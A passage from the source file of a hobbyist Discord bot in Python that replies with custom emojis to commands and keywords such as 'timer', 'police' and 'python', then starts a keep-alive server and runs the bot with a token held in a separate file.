async def _simppillsemojisend(ctx):
    await ctx.send("<:mag_simp_pills:812995814904561695>")


#WAT EMOJI
@client.command(aliases = ["what", "What", "wat", "Wat"])
async def _watemojisend(ctx):
    await ctx.send("<:mag_wat:812995793278468117>")


#ADMIN ABOOZ EMOJI
@client.command(aliases = ["abooz", "Abooz"])
async def _adminaboozemojisend(ctx):
    await ctx.send("<:mag_abooz:812995683740418068>")


#60S TIMER EMOJI
@client.listen("on_message")
async def _timeremoji(message):
    if message.author.bot:
        return
    if "timer" in message.content:
        await message.channel.send("<a:mag_60s_timer:812995903421022221>")
    if "Timer" in message.content:
        await message.channel.send("<a:mag_60s_timer:812995903421022221>")

@client.command(aliases = ["timer", "Timer"])
async def _timeremojisend(ctx):
    await ctx.send("<a:mag_60s_timer:812995903421022221>")


#RACIST EMOJI
@client.listen("on_message")
async def _racistemoji(message):
    if message.author.bot:
        return
    if "racist" in message.content:
        await message.channel.send("<:mag_rascist:812995663817342986>")
    if "Racist" in message.content:
        await message.channel.send("<:mag_rascist:812995663817342986>")

@client.command(aliases = ["racist", "Racist"])
async def _racistemojisend(ctx):
    await ctx.send("<:mag_rascist:812995663817342986>")


#POLICE EMOJI
@client.listen("on_message")
async def _policeemoji(message):
    if message.author.bot:
        return
    if "police" in message.content:
        await message.channel.send("<a:mag_police:812995767639212032>")
    if "Police" in message.content:
        await message.channel.send("<a:mag_police:812995767639212032>")

@client.command(aliases = ["police", "Police"])
async def _policeemojisend(ctx):
    await ctx.send("<a:mag_police:812995767639212032>")


#Fspam EMOJI
@client.command(aliases = ["fspam", "Fspam"])
async def _fspamemojisend(ctx):
    await ctx.send("<a:mag_Fspam:812995726710669342>")


#CLAP EMOJI
@client.command(aliases = ["clap", "Clap"])
async def _clapemojisend(ctx):
    await ctx.send("<a:mag_clap:812995595613896714>")


#YOU TRIED EMOJI
@client.command(aliases = ["youtried", "Youtried"])
async def _uoutriedemojisend(ctx):
    await ctx.send("<a:mag_youtried:812995570906038292>")


#PYTHON EMOJI SEND
@client.listen("on_message")
async def _pythonemoji(message):
    if message.author.bot:
        return
    if "python" in message.content:
        await message.channel.send("<a:mag_python:812995549414162474>")
    if "Python" in message.content:
        await message.channel.send("<a:mag_python:812995549414162474>")

@client.command(aliases = ["python", "Python"])
async def _pythonemojisend(ctx):
    await ctx.send("<a:mag_python:812995549414162474>")


#PEPEfog emoji
@client.command(aliases = ["pepepog", "Pepepog"])
async def _pepefogemojisend(ctx):
    await ctx.send("<a:mag_pepepog:812995528081276958>")


'''END OF EMOJI RESPONSE COMMANDS'''

'''FINAL IMPORTANT FUNCTIONS AND IMPORTANT STUFF'''
#KEEP ALIVE COMMAND FOR WEBSERVER
keep_alive()

#BOT TOKEN TO CONNECT TO DISCORD'S API
client.run(BOT_TOKEN) #token can be found in 'BOT_TOKEN.py'
